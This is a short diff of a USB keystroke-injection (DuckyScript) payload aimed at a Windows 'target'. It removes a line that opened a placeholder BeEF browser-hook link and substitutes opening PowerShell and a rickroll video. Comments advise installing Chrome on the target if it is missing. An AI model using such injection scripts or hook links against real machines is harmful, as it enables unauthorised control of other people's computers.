@@ -14,7 +14,11 @@ DELAY 1000
 REM delay to let device recognize usb device plugged in
 WINDOWS r
 DELAY 250
-STRING [system.Diagnostics.Process]::Start("chrome","https://BEeFlink.here")
+STRING powershell
+DELAY 250
+ENTER
+DELAY 1000
+STRING [system.Diagnostics.Process]::Start("chrome","https://youtube.com/watch?v=dQw4w9WgXcQ")
 
 REM By default the script will start chrome, if you know your target does not use chrome, simply install it with another script,
 REM or change it to edge for win based pc's.
